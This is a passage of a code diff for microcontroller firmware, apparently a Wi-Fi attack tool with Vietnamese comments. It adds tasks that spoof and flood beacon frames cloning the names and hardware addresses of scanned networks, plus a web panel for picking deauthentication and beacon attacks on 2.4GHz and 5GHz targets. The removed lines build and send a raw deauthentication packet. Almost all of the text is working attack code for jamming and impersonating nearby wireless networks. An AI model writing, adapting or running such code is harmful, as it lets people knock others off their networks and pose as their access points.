+          for (int j = 0; j < FRAMES_PER_BEACON; j++) {
+            wifi_tx_beacon_frame(scan_results[idx].bssid, broadcast, scan_results[idx].ssid.c_str());
+            vTaskDelay(pdMS_TO_TICKS(5));
+          }
+          DEBUG_SER_PRINT("Beacon sent for 2.4GHz target idx: " + String(idx) + "\n");
+        }
+        currentBeaconIndex24 = (currentBeaconIndex24 + 1) % beacon_targets_24.size();
+      }
+      // Xử lý các mục tiêu băng 5GHz
+      if (!beacon_targets_5.empty()) {
+        int idx = beacon_targets_5[currentBeaconIndex5];
+        if (idx >= 0 && idx < (int)scan_results.size()) {
+          wext_set_channel(WLAN0_NAME, scan_results[idx].channel);
+          for (int j = 0; j < FRAMES_PER_BEACON; j++) {
+            wifi_tx_beacon_frame(scan_results[idx].bssid, broadcast, scan_results[idx].ssid.c_str());
+            vTaskDelay(pdMS_TO_TICKS(5));
+          }
+          DEBUG_SER_PRINT("Beacon sent for 5GHz target idx: " + String(idx) + "\n");
+        }
+        currentBeaconIndex5 = (currentBeaconIndex5 + 1) % beacon_targets_5.size();
+      }
+    }
+    vTaskDelay(pdMS_TO_TICKS(10));
   }
-  return str;
 }
 
-unsigned long now = 0;
-unsigned long wifinow = 0;
-unsigned long deauth_now = 0;
+// --------------------------------------------------
+// Task: Thực hiện phát Beacon Flood (gửi nhanh loát beacon frames)
+// Sử dụng FRAMES_PER_BEACON_FLOOD beacon frame cho mỗi mục tiêu.
+void BeaconFloodTask(void *pvParameters) {
+  (void) pvParameters;
+  uint8_t broadcast[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
+  while (1) {
+    if (currentState == STATE_BEACON_FLOOD) {
+      // Xử lý các mục tiêu băng 2.4GHz
+      if (!beacon_targets_24.empty()) {
+        int idx = beacon_targets_24[currentBeaconIndex24];
+        if (idx >= 0 && idx < (int)scan_results.size()) {
+          wext_set_channel(WLAN0_NAME, scan_results[idx].channel);
+          for (int j = 0; j < FRAMES_PER_BEACON_FLOOD; j++) {
+            wifi_tx_beacon_frame(scan_results[idx].bssid, broadcast, scan_results[idx].ssid.c_str());
+            vTaskDelay(pdMS_TO_TICKS(1));
+          }
+          DEBUG_SER_PRINT("Beacon flood sent for 2.4GHz target idx: " + String(idx) + "\n");
+        }
+        currentBeaconIndex24 = (currentBeaconIndex24 + 1) % beacon_targets_24.size();
+      }
+      // Xử lý các mục tiêu băng 5GHz
+      if (!beacon_targets_5.empty()) {
+        int idx = beacon_targets_5[currentBeaconIndex5];
+        if (idx >= 0 && idx < (int)scan_results.size()) {
+          wext_set_channel(WLAN0_NAME, scan_results[idx].channel);
+          for (int j = 0; j < FRAMES_PER_BEACON_FLOOD; j++) {
+            wifi_tx_beacon_frame(scan_results[idx].bssid, broadcast, scan_results[idx].ssid.c_str());
+            vTaskDelay(pdMS_TO_TICKS(1));
+          }
+          DEBUG_SER_PRINT("Beacon flood sent for 5GHz target idx: " + String(idx) + "\n");
+        }
+        currentBeaconIndex5 = (currentBeaconIndex5 + 1) % beacon_targets_5.size();
+      }
+    }
+    vTaskDelay(pdMS_TO_TICKS(10));
+  }
+}
 
-uint8_t broadcast[6] = { 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF };
-uint8_t wifi_channel = 1;
+// --------------------------------------------------
+// setup(): khởi tạo WiFi AP, quét mạng ban đầu và tạo các task FreeRTOS
+void setup() {
+  // Cấu hình chân LED
+  pinMode(LED_R, OUTPUT);
+  pinMode(LED_G, OUTPUT);
+  pinMode(LED_B, OUTPUT);
 
+  DEBUG_SER_INIT();
+
+  char channelStr[4];
+  snprintf(channelStr, sizeof(channelStr), "%d", current_channel);
+  WiFi.apbegin((char*)ssid_ap, (char*)pass_ap, channelStr);
+
+  // Quét mạng ban đầu
+  scanNetworks();
+
+  currentState = STATE_IDLE;
+  digitalWrite(LED_R, HIGH);  // Idle: LED đỏ sáng
+
+  // Tạo các task FreeRTOS
+  xTaskCreate(LEDUpdateTask, "LEDUpdate", 1024, NULL, 1, NULL);
+  xTaskCreate(WebServerTask, "WebServer", 4096, NULL, 1, NULL);
+  xTaskCreate(AttackTask, "Attack", 2048, NULL, 2, NULL);
+  xTaskCreate(BeaconTask, "Beacon", 2048, NULL, 2, NULL);
+  xTaskCreate(BeaconFloodTask, "BeaconFlood", 2048, NULL, 2, NULL);
+}
+
+// --------------------------------------------------
+// loop()
 void loop() {
-  dnsServer.processNextRequest();
-  webServer.handleClient();
+  updateLEDs();
 
-  if (deauthing_active && millis() - deauth_now >= 1000) {
-
-    wifi_set_channel(_selectedNetwork.ch);
-
-    uint8_t deauthPacket[26] = {0xC0, 0x00, 0x00, 0x00, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0x00, 0x00, 0x01, 0x00};
-
-    memcpy(&deauthPacket[10], _selectedNetwork.bssid, 6);
-    memcpy(&deauthPacket[16], _selectedNetwork.bssid, 6);
-    deauthPacket[24] = 1;
-
-    Serial.println(bytesToStr(deauthPacket, 26));
-    deauthPacket[0] = 0xC0;
-    Serial.println(wifi_send_pkt_freedom(deauthPacket, sizeof(deauthPacket), 0));
-    Serial.println(bytesToStr(deauthPacket, 26));
-    deauthPacket[0] = 0xA0;
-    Serial.println(wifi_send_pkt_freedom(deauthPacket, sizeof(deauthPacket), 0));
-
-    deauth_now = millis();
-  }
-
-  if (millis() - now >= 15000) {
-    performScan();
-    now = millis();
-  }
-
-  if (millis() - wifinow >= 2000) {
-    if (WiFi.status() != WL_CONNECTED) {
-      Serial.println("BAD");
-    } else {
-      Serial.println("GOOD");
+  // Xử lý HTTP nếu cần (trường hợp không dùng task WebServer)
+  WiFiClient client = server.available();
+  if (client.connected()) {
+    String request;
+    while (client.available()) {
+      request += (char)client.read();
+      delay(1);
     }
-    wifinow = millis();
+    
+    if (request.length() == 0 || request.indexOf("favicon.ico") >= 0) {
+      client.stop();
+      return;
+    }
+    
+    DEBUG_SER_PRINT("Request: " + request + "\n");
+    String path = parseRequest(request);
+    DEBUG_SER_PRINT("Path: " + path + "\n");
+
+    if (path == "/" || path == "/index.html") {
+      handleRoot(client);
+    } 
+    else if (path == "/rescan") {
+      scanNetworks();
+      handleRoot(client);
+    } 
+    else if (path == "/action") {
+      std::vector<std::pair<String, String>> post_data = parsePost(request);
+      String action = "";
+      for (auto &param : post_data) {
+        if (param.first == "action") {
+          action = param.second;
+          break;
+        }
+      }
+      if (action == "deauth") {
+        attack_targets_24.clear();
+        attack_targets_5.clear();
+        for (auto &param : post_data) {
+          if (param.first == "network") {
+            int idx = param.second.toInt();
+            if (idx >= 0 && idx < (int)scan_results.size()) {
+              uint8_t ch = scan_results[idx].channel;
+              if (ch >= 36)
+                attack_targets_5.push_back(idx);
+              else
+                attack_targets_24.push_back(idx);
+              DEBUG_SER_PRINT("Deauth target idx: " + String(idx) + " (" + ((ch>=36)?"5GHz":"2.4GHz") + ")\n");
+            }
+          }
+        }
+        if (!attack_targets_24.empty() || !attack_targets_5.empty()) {
+          currentState = STATE_ATTACK;
+          currentTargetIndex24 = 0;
+          currentTargetIndex5 = 0;
+          lastAttackTime24 = millis();
+          lastAttackTime5  = millis();
+        }
+      } else if (action == "beacon") {
+        beacon_targets_24.clear();
+        beacon_targets_5.clear();
+        for (auto &param : post_data) {
+          if (param.first == "network") {
+            int idx = param.second.toInt();
+            if (idx >= 0 && idx < (int)scan_results.size()) {
+              uint8_t ch = scan_results[idx].channel;
+              if (ch >= 36)
+                beacon_targets_5.push_back(idx);
+              else
+                beacon_targets_24.push_back(idx);
+              DEBUG_SER_PRINT("Beacon target idx: " + String(idx) + " (" + ((ch>=36)?"5GHz":"2.4GHz") + ")\n");
+            }
+          }
+        }
+        if (!beacon_targets_24.empty() || !beacon_targets_5.empty()) {
+          currentState = STATE_BEACON;
+          currentBeaconIndex24 = 0;
+          currentBeaconIndex5 = 0;
+        }
+      } else if (action == "beacon_flood") {
+        beacon_targets_24.clear();
+        beacon_targets_5.clear();
+        for (auto &param : post_data) {
+          if (param.first == "network") {
+            int idx = param.second.toInt();
+            if (idx >= 0 && idx < (int)scan_results.size()) {
+              uint8_t ch = scan_results[idx].channel;
+              if (ch >= 36)
+                beacon_targets_5.push_back(idx);
+              else
+                beacon_targets_24.push_back(idx);
+              DEBUG_SER_PRINT("Beacon flood target idx: " + String(idx) + " (" + ((ch>=36)?"5GHz":"2.4GHz") + ")\n");
+            }
+          }
+        }
+        if (!beacon_targets_24.empty() || !beacon_targets_5.empty()) {
+          currentState = STATE_BEACON_FLOOD;
+          currentBeaconIndex24 = 0;
+          currentBeaconIndex5 = 0;
+        }
+      }
+      handleRoot(client);
+    } else if (path == "/stop") {
+      currentState = STATE_IDLE;
+      attack_targets_24.clear();
+      attack_targets_5.clear();
+      beacon_targets_24.clear();
+      beacon_targets_5.clear();
+      handleRoot(client);
+    } else {
+      handle404(client);
+    }
+    client.stop();
   }
+  // Nếu dùng task WebServer, loop() không cần xử lý HTTP liên tục.
 }
